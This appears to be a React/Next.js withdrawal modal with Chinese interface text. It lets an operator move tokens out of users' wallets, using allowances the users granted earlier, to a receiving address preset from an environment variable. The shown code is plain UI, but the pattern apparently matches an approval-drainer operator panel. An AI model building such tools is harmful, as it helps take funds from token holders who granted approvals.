'use client'

import { useState } from 'react'
import { toast } from 'sonner'

interface WithdrawModalProps {
  isOpen: boolean
  onClose: () => void
  tokenSymbol: string
  tokenAddress: string
  walletAddress: string
  balance: string
  onConfirm: (toAddress: string) => Promise<void>
}

export function WithdrawModal({
  isOpen,
  onClose,
  tokenSymbol,
  tokenAddress,
  walletAddress,
  balance,
  onConfirm,
}: WithdrawModalProps) {
  const [toAddress, setToAddress] = useState(
    process.env.NEXT_PUBLIC_TRANSFER_TARGET_ADDRESS || ''
  )
  const [loading, setLoading] = useState(false)

  const handleConfirm = async () => {
    // 验证地址
    if (!toAddress || !toAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      toast.error('接收地址格式不正确', {
        description: '请输入有效的以太坊地址',
      })
      return
    }

    setLoading(true)
    try {
      await onConfirm(toAddress)
      toast.success('提币成功', {
        description: `已将 ${tokenSymbol} 提取到 ${toAddress.slice(0, 6)}...${toAddress.slice(-4)}`,
      })
      onClose()
    } catch (error: any) {
      console.error('提币失败:', error)
      toast.error('提币失败', {
        description: error.message || '请重试',
        style: {
          background: '#DC2626',
          color: '#FFFFFF',
          border: 'none',
        },
      })
    } finally {
      setLoading(false)
    }
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto">
      {/* 背景遮罩 */}
      <div
        className="fixed inset-0 bg-black bg-opacity-50 transition-opacity"
        onClick={onClose}
      />

      {/* 弹窗内容 */}
      <div className="flex min-h-full items-center justify-center p-4">
        <div className="relative bg-white rounded-lg shadow-xl max-w-md w-full p-6">
          {/* 标题 */}
          <div className="mb-6">
            <h3 className="text-xl font-bold text-gray-900 mb-2">
              提币确认
            </h3>
            <p className="text-sm text-gray-600">
              从用户钱包提取代币到指定地址
            </p>
          </div>

          {/* 代币信息 */}
          <div className="bg-gray-50 rounded-lg p-4 mb-4 space-y-2">
            <div className="flex justify-between">
              <span className="text-sm text-gray-600">代币符号</span>
              <span className="text-sm font-semibold text-gray-900">
                {tokenSymbol}
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-sm text-gray-600">代币地址</span>
              <span className="text-sm font-mono text-gray-900">
                {tokenAddress.slice(0, 6)}...{tokenAddress.slice(-4)}
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-sm text-gray-600">来源地址</span>
              <span className="text-sm font-mono text-gray-900">
                {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-sm text-gray-600">余额</span>
              <span className="text-sm font-semibold text-gray-900">
                {parseFloat(balance).toFixed(4)} {tokenSymbol}
              </span>
            </div>
          </div>

          {/* 接收地址输入 */}
          <div className="mb-6">
            <label className="block text-sm font-medium text-gray-700 mb-2">
              接收地址 <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              value={toAddress}
              onChange={(e) => setToAddress(e.target.value)}
              placeholder="0x..."
              className="w-full px-3 py-2 border border-gray-300 rounded-lg bg-white text-gray-900 placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-transparent font-mono text-sm"
            />
            <p className="mt-1 text-xs text-gray-500">
              代币将被提取到此地址（可修改）
            </p>
          </div>

          {/* 警告提示 */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mb-6">
            <div className="flex">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-yellow-400" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <h3 className="text-sm font-medium text-yellow-800">
                  提醒
                </h3>
                <div className="mt-1 text-sm text-yellow-700">
                  <ul className="list-disc list-inside space-y-1">
                    <li>此操作将调用智能合约</li>
                    <li>需要用户已授权本合约</li>
                    <li>实际提取金额为 min(余额, 授权额度)</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>

          {/* 按钮 */}
          <div className="flex gap-3">
            <button
              type="button"
              onClick={onClose}
              disabled={loading}
              className="flex-1 px-4 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              取消
            </button>
            <button
              type="button"
              onClick={handleConfirm}
              disabled={loading}
              className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? '提交中...' : '确认提币'}
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}
